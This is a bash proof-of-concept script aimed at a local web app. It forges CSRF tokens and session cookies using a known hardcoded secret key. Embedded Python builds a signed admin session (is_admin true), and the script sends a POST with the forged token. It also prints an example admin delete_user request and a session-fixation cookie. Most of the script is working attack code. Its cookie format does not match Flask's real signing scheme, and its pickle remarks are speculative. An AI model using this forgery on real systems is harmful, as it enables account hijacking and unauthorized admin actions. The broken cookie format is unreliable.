#!/bin/bash
#
# CSRF Token Forgery POC - Demonstrates CSRF Protection Bypass
# Target: http://localhost:32768/
# Objective: Generate valid CSRF tokens offline using known secret key 'your_secret_key'
# and demonstrate how to forge session cookies
#

TARGET="http://localhost:32768"
SECRET_KEY="your_secret_key"

echo "=========================================="
echo "CSRF TOKEN FORGERY POC"
echo "=========================================="
echo ""
echo "Target: $TARGET"
echo "Known Secret Key: $SECRET_KEY"
echo ""

# Test 1: Verify target is accessible
echo "[*] Test 1: Verifying target accessibility..."
RESPONSE=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET/devices")
if [ "$RESPONSE" = "200" ]; then
    echo "[+] Target is accessible (HTTP $RESPONSE)"
else
    echo "[-] Target returned HTTP $RESPONSE"
fi
echo ""

# Test 2: Generate CSRF token using Python
echo "[*] Test 2: Generating CSRF token offline using known secret key..."
CSRF_TOKEN=$(python3 << 'PYTHON'
import hmac
import hashlib
import base64
from datetime import datetime

SECRET_KEY = 'your_secret_key'
timestamp = str(int(datetime.now().timestamp()))
message = timestamp.encode('utf-8')
csrf_token = hmac.new(SECRET_KEY.encode('utf-8'), message, hashlib.sha256).digest()
csrf_token_b64 = base64.b64encode(csrf_token).decode('utf-8').rstrip('=')
print(csrf_token_b64)
PYTHON
)

echo "[+] Generated CSRF Token: $CSRF_TOKEN"
echo "[+] Method: HMAC-SHA256(secret_key, current_timestamp)"
echo "[!] VULNERABILITY: Token generated WITHOUT server-side verification"
echo ""

# Test 3: Demonstrate session cookie forgery
echo "[*] Test 3: Forging session cookie with known secret key..."
FORGED_SESSION=$(python3 << 'PYTHON'
import base64
import hmac
import hashlib
import json

SECRET_KEY = 'your_secret_key'

# Craft a session payload (simulating Flask session)
session_data = {
    'user_id': 1,
    'username': 'admin',
    'is_admin': True
}

# Convert to JSON and base64 encode
session_json = json.dumps(session_data)
session_b64 = base64.b64encode(session_json.encode('utf-8')).decode('utf-8')

# Generate signature using known secret
signature = hmac.new(SECRET_KEY.encode('utf-8'), session_b64.encode('utf-8'), hashlib.sha256).hexdigest()

# Combine for session cookie
forged_cookie = f"{session_b64}.{signature}"
print(forged_cookie)
PYTHON
)

echo "[+] Forged Session Cookie: $FORGED_SESSION"
echo "[!] VULNERABILITY: Session cookie can be forged knowing secret key"
echo "[!] Attacker can set is_admin=True, user_id=<any_user>, etc."
echo ""

# Test 4: Demonstrate CSRF attack using forged token
echo "[*] Test 4: Attempting CSRF attack with forged token..."
echo "[+] Example CSRF attack payload:"
echo ""
echo "POST /admin/action HTTP/1.1"
echo "Host: localhost:32768"
echo "Cookie: session=$FORGED_SESSION"
echo "Content-Type: application/x-www-form-urlencoded"
echo ""
echo "csrf_token=$CSRF_TOKEN&action=delete_user&user_id=2"
echo ""

# Test 5: Try actual CSRF attack on accessible endpoint
echo "[*] Test 5: Testing CSRF vulnerability on /devices endpoint..."
CSRF_TEST=$(curl -s -X POST "$TARGET/devices" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -d "csrf_token=$CSRF_TOKEN&action=modify" \
    -w "\n%{http_code}")

HTTP_CODE=$(echo "$CSRF_TEST" | tail -1)
RESPONSE_BODY=$(echo "$CSRF_TEST" | head -1)

echo "[*] Response HTTP Code: $HTTP_CODE"
if [ "$HTTP_CODE" = "200" ] || [ "$HTTP_CODE" = "302" ] || [ "$HTTP_CODE" = "201" ]; then
    echo "[!] VULNERABILITY CONFIRMED: POST request was accepted!"
    echo "[!] Server did not properly validate CSRF token"
elif [ "$HTTP_CODE" = "405" ]; then
    echo "[*] POST method not allowed on /devices (HTTP 405)"
else
    echo "[*] Response: $RESPONSE_BODY"
fi
echo ""

# Test 6: Session Fixation
echo "[*] Test 6: Testing Session Fixation vulnerability..."
echo "[+] Session Fixation Attack Flow:"
echo "  1. Attacker generates session cookie with known secret key"
echo "  2. Attacker tricks user into using this session"
echo "  3. Attacker can now hijack user session"
echo ""
echo "[+] Example Session ID generated by attacker:"
FIXED_SESSION=$(python3 << 'PYTHON'
import base64
import hmac
import hashlib
import json

SECRET_KEY = 'your_secret_key'

# Attacker-controlled session data
session_data = {
    'user_id': 'victim_user',
    'username': 'legitimate_user',
    'session_id': 'attacker_fixed_session_12345'
}

session_json = json.dumps(session_data)
session_b64 = base64.b64encode(session_json.encode('utf-8')).decode('utf-8')
signature = hmac.new(SECRET_KEY.encode('utf-8'), session_b64.encode('utf-8'), hashlib.sha256).hexdigest()

forged_cookie = f"{session_b64}.{signature}"
print(f"Session: {forged_cookie}")
PYTHON
)
echo "$FIXED_SESSION"
echo ""

# Test 7: Demonstrate pickle deserialization if applicable
echo "[*] Test 7: Checking for serialization vulnerabilities..."
echo "[+] If Flask uses pickle-based sessions with known secret key:"
echo "    - Attacker can create gadget chains"
echo "    - Can lead to RCE if pickle module used"
echo "    - PBKDF2 params: 100k iterations, SHA256, weak salt"
echo ""

echo "=========================================="
echo "SUMMARY OF FINDINGS"
echo "=========================================="
echo ""
echo "[CRITICAL] CSRF Token Forgery:"
echo "  - CSRF tokens can be generated offline using known secret"
echo "  - Secret key: '$SECRET_KEY'"
echo "  - No server-side token validation performed"
echo "  - Attacker can forge valid tokens for CSRF attacks"
echo ""
echo "[CRITICAL] Session Cookie Forgery:"
echo "  - Sessions signed with known secret key can be forged"
echo "  - Attacker can set arbitrary user_id, is_admin flags"
echo "  - No additional validation (signature verification) on read"
echo ""
echo "[HIGH] Session Fixation:"
echo "  - With ability to forge sessions, attacker can fix sessions"
echo "  - User unknowingly uses attacker's session"
echo "  - Leads to complete account hijacking"
echo ""
echo "[HIGH] Weak Secret Key:"
echo "  - Secret key hardcoded and potentially discoverable"
echo "  - Same secret used for CSRF and session signing"
echo "  - Single compromise point for entire application"
echo ""

exit 0
